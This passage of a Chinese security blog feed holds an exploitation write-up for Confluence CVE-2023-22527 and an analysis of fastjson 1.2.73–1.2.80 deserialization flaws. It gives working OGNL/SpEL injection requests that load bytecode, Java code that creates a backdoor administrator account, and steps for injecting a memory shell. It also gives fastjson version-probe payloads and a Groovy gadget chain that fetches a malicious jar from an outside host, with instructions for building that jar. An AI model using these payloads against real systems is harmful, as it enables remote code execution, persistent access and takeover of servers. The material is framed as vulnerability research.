上，JDK9后的高版本 JDK 加入了模块化设计，无法直接在 js 代码中调用 **<code>java.lang</code><strong>；这里我尝试了使用</strong><code>&quot;&quot;.getClass().getClassLoader().getClass()xxxx</code>**来测试，发现 JDK9 后也取消了 **<code>Object.getClass()</code><strong>方法</strong><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093005381.png" alt="image-20240307093005381"><br>基于这种情况，只能换一种方式来加载字节码了，好在 confluence 中加载的组件较多，于是测试结合 SpEL 表达式来实现字节码的加载<br>先测试一下命令执行的字节码，加载字节码成功</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression(@org.apache.struts2.ServletActionContext@getRequest().getParameter(&#x27;spel&#x27;)).getValue()&amp;spel=T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;bytecode.addUser&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;base64Classxxxxxxxxxxxx&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093052624.png" alt="image-20240307093052624"></p><h3 id="4-6-使用类加载实现添加管理员和内存马"><a href="#4-6-使用类加载实现添加管理员和内存马" class="headerlink" title="4.6. 使用类加载实现添加管理员和内存马"></a>4.6. 使用类加载实现添加管理员和内存马</h3><p>构造一下添加管理员的思路的利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DefaultUserAccessor dua = (DefaultUserAccessor)ContainerManager.getComponent(<span class="string">&quot;userAccessorTarget&quot;</span>);</span><br><span class="line">DefaultUser defaultUser = <span class="keyword">new</span> DefaultUser(<span class="string">&quot;atlassian5&quot;</span>, <span class="string">&quot;atlassian5&quot;</span>, <span class="string">&quot;a5@atlassian5.com&quot;</span>);</span><br><span class="line">Credential credential = Credential.unencrypted(<span class="string">&quot;1qaz@WSX&quot;</span>);</span><br><span class="line">Method method1 = bucket.user.DefaultUserAccessor.class.getDeclaredMethod(<span class="string">&quot;getUserManager&quot;</span>);</span><br><span class="line">method1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">UserManager getUserManager = (UserManager) method1.invoke(dua);</span><br><span class="line">User user = getUserManager.createUser(defaultUser, credential);</span><br><span class="line">Group group = dua.getGroup(<span class="string">&quot;confluence-administrators&quot;</span>);</span><br><span class="line">Method method2 =  bucket.user.DefaultUserAccessor.class.getDeclaredMethod(<span class="string">&quot;getGroupManager&quot;</span>);</span><br><span class="line">method2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">GroupManager groupManager = (GroupManager) method2.invoke(dua);</span><br><span class="line">groupManager.addMembership(group,user);</span><br></pre></td></tr></table></figure><ul><li>测试添加管理员成功</li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093111575.png" alt="image-20240307093111575"></p><ul><li>内存马的话，由于字节码加载已经解决，直接使用 tomcat 的内存马测试，但是又遇到了异常，<strong>报错显示 SpEL 表达式过长，大于 10000 个字符</strong></li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093128794.png" alt="image-20240307093128794"><br>解决内存马注入问题：继续分解 SpEL 表达式的长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression(@org.apache.struts2.ServletActionContext@getRequest().getParameter(&#x27;spel&#x27;)).getValue()&amp;spel=T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;bytecode.tomcat&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(T(org.apache.struts2.ServletActionContext).getRequest().getParameter(&#x27;code&#x27;)),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()&amp;code=yv66vgAAAD.........</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093200943.png" alt="image-20240307093200943"></p><hr><p>后面又发现 <code>github</code> 有个项目发布注入内存马：<a href="https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHEL%EF%BC%8C%E8%80%8C%E4%B8%94%E6%80%9D%E8%B7%AF%E5%BE%88%E5%A5%BD">https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHEL，而且思路很好</a></p><ul><li>他这里先发送一个请求使用 <code>@ognl.Ognl@applyExpressionMaxLength(100000)</code>把<code>Ognl</code> 表达式长度限制修改掉</li><li>然后再发送一个请求，直接在 Ognl 表达式中使用<code>org.springframework.cglib.core.ReflectUtils</code> 加载内存马</li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093212186.png" alt="image-20240307093212186"></p>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.73-1.2.80漏洞分析</title>
      <link href="/2022/11/11/fastjson%201.2.73-12.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/11/fastjson%201.2.73-12.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="1-版本探测"><a href="#1-版本探测" class="headerlink" title="1. 版本探测"></a>1. 版本探测</h2><p>结合之前1.2.24、1.2.47、1.2.68、1.2.80不同阶段对autoTypeSupport的绕过，整理如下检测版本的poc</p><ul><li>&lt;=1.2.24</li></ul><p>随便加载一个类，再使用<code>Inet4Address</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.error&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.net.Inet4Address&quot;,</span><br><span class="line">        &quot;val&quot;: &quot;DNSLOG&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>1.2.25 ~ 1.2.47</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;java.lang.Error&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Error&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;DNSLOG&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li><p>1.2.48 ~ 1.2.68</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;DNSLOG&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>1.2.69~1.2.80</p><ul><li>如果版本为1.2.83，则 21.DNSLOG和22.DNSLOG的dns请求都会收到，如果版本&lt;=1.2.80， 则只能收到第一个dnslog请求</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;21.DNSLOG&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;message&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;22.DNSLOG&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在1.2.80中，由于进入<code>ThrowableDeserializer</code>反序列化工具类，当Key是message时，抛出异常；而1.2.83中修复了Throwable的相关问题，导致message的key不再具有特殊性，因此可以收到dnslog</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/1.png" alt="1" style="zoom:50%;" /></div><ul><li>1.2.83</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;DNSLOG&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ThrowableDeserializer"><a href="#2-ThrowableDeserializer" class="headerlink" title="2. ThrowableDeserializer"></a>2. ThrowableDeserializer</h2><p>当指定<code>@type</code>为<code>java.lang.Exception</code>时，反序列化过程中会指定<code>ThrowableDeserializer</code>为反序列化的工具类</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/2.png" alt="2" style="zoom:50%;" /></div><p>接下来，在执行到 <code>checkAutoType</code>方法时，因为传入了<code>Throwable.class</code>作为 <code>expectClass</code>，和1.2.68使用<code>AutoCloseable</code>一样，绕过了<code>AutoTypeSupport</code>的判断</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/3.png" alt="3" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/4.png" alt="4" style="zoom:50%;" /></div>完成类加载，但是这里由于`cache`是false，因此类并没有像之前`1.2.47`那样，被加到`mappings`中<div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/5.png" alt="5" style="zoom:50%;" /></div><h2 id="3-利用链"><a href="#3-利用链" class="headerlink" title="3. 利用链"></a>3. 利用链</h2><p>关于这个漏洞的绕过，1.2.68的思路差不多，不过利用链却不好找，参考浅蓝的分享</p><h3 id="3-1-依赖判断"><a href="#3-1-依赖判断" class="headerlink" title="3.1 依赖判断"></a>3.1 依赖判断</h3><h4 id="3-1-2-报错回显判断"><a href="#3-1-2-报错回显判断" class="headerlink" title="3.1.2 报错回显判断"></a>3.1.2 报错回显判断</h4><p>返回包可以看到报错的大概内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Character&quot;</span>&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;类名&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>依赖存在，返回 <code>can not cast to char, value : class com.mysql.jdbc.Driver</code></li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/6.png" alt="6" style="zoom:50%;" /></div><ul><li>依赖不存在，返回 <code>not close json text, token : &#125;</code></li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/7.png" alt="7" style="zoom:50%;" /></div><h4 id="3-1-3-dnslog判断"><a href="#3-1-3-dnslog判断" class="headerlink" title="3.1.3 dnslog判断"></a>3.1.3 dnslog判断</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line"><span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span> &#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line"><span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">&quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">&quot;language&quot;: &#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.lang.String&quot; &#123;</span><br><span class="line">1: &#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">&quot;val&quot;: &quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;country&quot;: &quot;DNSLOG&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>依赖类存在则会组成 <code>&#123;&quot;1&quot;: &quot;com.mysql.jdbc.Driver&quot;&#125;_x.DNSLOG</code></li><li>依赖类不存在，<code>&#123;&#125;_x.DNSLOG</code> </li><li><strong>测试中这种格式的dns请求，只在mac上可以成功</strong></li></ul><h3 id="3-2-groovy利用链"><a href="#3-2-groovy利用链" class="headerlink" title="3.2 groovy利用链"></a>3.2 groovy利用链</h3><p><strong>适用版本：1.2.76~1.2.80</strong></p><h4 id="3-2-1-让ProcessingUnit绕过autoType"><a href="#3-2-1-让ProcessingUnit绕过autoType" class="headerlink" title="3.2.1 让ProcessingUnit绕过autoType"></a>3.2.1 让ProcessingUnit绕过autoType</h4><ul><li>groovy远程类加载的利用链中，分为两部分，第一部分通过<code>CompilationFailedException</code>利用Exception的特性绕过autoType进行反序列化；</li><li>在反序列化<code>CompilationFailedException</code>的过程中，由于构造方法存在<code>ProcessingUnit</code>类型的参数，fastjson在生成<code>FieldDeserializer</code>时，完成了类加载，并将生成<code>ProcessingUnit</code>类对应的反序列化工具类加入了<code>ParseConfig.deserializers</code>中；</li><li>后续在加载<code>ProcessingUnit</code>进入autoType时，虽然不在mappings的类缓存中，但是在<code>deserializers</code>中有映射的工具类，也可以通过类加载</li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/8.png" alt="8" style="zoom:50%;" /></div><p><code>CompilationFailedException</code>类的继承关系</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/9.png" alt="9" style="zoom:50%;" /></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CompilationFailedException</span><span class="params">(<span class="keyword">int</span> phase, ProcessingUnit unit, Throwable cause)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(Phases.getDescription(phase) + <span class="string">&quot; failed&quot;</span>, cause);</span><br><span class="line">    <span class="keyword">this</span>.phase = phase;</span><br><span class="line">    <span class="keyword">this</span>.unit = unit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照浅蓝的分享，<code>Poc</code>如下，unit参数是<code>ProcessingUnit</code>类型</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;unit&quot;</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化过程中，获取参数类型对应的反序列化工具类</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/10.png" alt="10" style="zoom:50%;" /></div><p>当参数的类型不是内置的一些类型后，使用<code>createJavaBeanDeserializer</code>创建默认的JavaBean的反序列化工具类<br>并在<code>ParseConfig.deserializers</code> 中添加当前类对应的反序列化工具类的映射</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/11.png" alt="11" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/12.png" alt="12" style="zoom:50%;" /></div><h4 id="3-2-2-使用JavaStubCompilationUnit远程类加载"><a href="#3-2-2-使用JavaStubCompilationUnit远程类加载" class="headerlink" title="3.2.2 使用JavaStubCompilationUnit远程类加载"></a>3.2.2 使用JavaStubCompilationUnit远程类加载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span>,</span><br><span class="line">  <span class="string">&quot;config&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span>,</span><br><span class="line">    <span class="string">&quot;classpathList&quot;</span>:[<span class="string">&quot;http://VPS/a.jar&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;gcl&quot;</span>:<span class="keyword">null</span>,</span><br><span class="line">  <span class="string">&quot;destDir&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>groovy创建<code>ClassLoader</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JavaStubCompilationUnit&lt;init&gt; -&gt; super(config, (CodeSource)null, gcl);</span><br><span class="line">CompilationUnit&lt;init&gt; -&gt; super(configuration, loader, (ErrorCollector)null);</span><br><span class="line">ProcessingUnit&lt;init&gt; -&gt; this.setClassLoader(classLoader);</span><br><span class="line">ProcessingUtit#setClassLoader -&gt; this.createClassLoader()</span><br><span class="line"></span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/13.png" alt="13" style="zoom:50%;" /></div><p>添加classpath</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/a.png" alt="a" style="zoom:50%;" /></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CompilationUnit&lt;init&gt; -&gt; this.addPhaseOperations();</span><br><span class="line">CompilationUnit#addPhaseOperations -&gt; ASTTransformationVisitor.addPhaseOperations(this);</span><br><span class="line">ASTTransformationVisitor#addPhaseOperations -&gt; addGlobalTransforms(context);</span><br><span class="line">ASTTransformationVisitor#addGlobalTransforms -&gt; doAddGlobalTransforms(context, true);</span><br><span class="line">ASTTransformationVisitor#doAddGlobalTransforms -&gt; addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>doAddGlobalTransforms</code>中，<code>GroovyClassLoader</code>在classpath中获取<code>org.codehaus.groovy.transform.ASTTransformation</code>文件内容，将读到的文件内容作为<code>className</code>放入<code>transfromNames</code>中</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/15.png" alt="13" style="zoom:50%;" /></div><p>继续执行，进入<code>addPhaseOperationsForGlobalTransforms</code>中，使用<code>ProcessingUnit</code>初始化时创建的<code>GroovyClassLoader</code>，遍历<code>transfromNames</code>中的className，并完成类加载和实例化</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/16.png" alt="16" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/17.png" alt="17" style="zoom:50%;" /></div><h4 id="3-2-3-poc构造"><a href="#3-2-3-poc构造" class="headerlink" title="3.2.3 poc构造"></a>3.2.3 poc构造</h4><p>根据前面类加载的流程，构造的jar包需要满足一下条件触发恶意代码</p><ul><li>jar文件中需要有<code>/META-INF/services/org.codehaus.groovy.transform.ASTTransformation</code>，文件内容为恶意类的名称</li><li>jar文件的poc可以使用<code>static</code>代码块或者默认构造方法中</li><li>jar文件中poc需要使用<code>GroovyASTTransformation</code>的注解</li></ul><p><strong>恶意类构造示例</strong></p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/18.png" alt="18" style="zoom:50%;" /></div><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;unit&quot;</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;config&quot;</span>:&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;classpathList&quot;</span>:[<span class="string">&quot;http://127.0.0.1:8889/groovyJar.jar&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;gcl&quot;</span>:<span class="literal">null</span>,</span><br><span class="line">  <span class="attr">&quot;destDir&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-2-3-1-计算器"><a href="#3-2-3-1-计算器" class="headerlink" title="3.2.3.1 计算器"></a>3.2.3.1 计算器</h5><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/19.png" alt="19" style="zoom:50%;" /></div><h5 id="3-2-3-2-回显"><a href="#3-2-3-2-回显" class="headerlink" title="3.2.3.2 回显"></a>3.2.3.2 回显</h5><ul><li>实战中也可以构造对应中间回显/内存马进行远程调用</li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/20.png" alt="20" style="zoom:50%;" /></div><h3 id="3-3-JPython-pgsql-springContext利用链"><a href="#3-3-JPython-pgsql-springContext利用链" class="headerlink" title="3.3 JPython + pgsql + springContext利用链"></a>3.3 JPython + pgsql + springContext利用链</h3><p>版本：<code>&lt;=1.2.80</code> <code>1.2.68-1.2.76</code>之间也可以<br><strong>依赖类：</strong></p><ul><li><code>org.python.antlr.ParseException</code></li><li><code>com.ziclix.python.sql.PyConnection</code></li><li><code>org.postgresql.jdbc.PgConnection</code></li><li><code>org.springframework.context.support.ClassPathXmlApplicationContext</code></li></ul><p><strong>maven：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 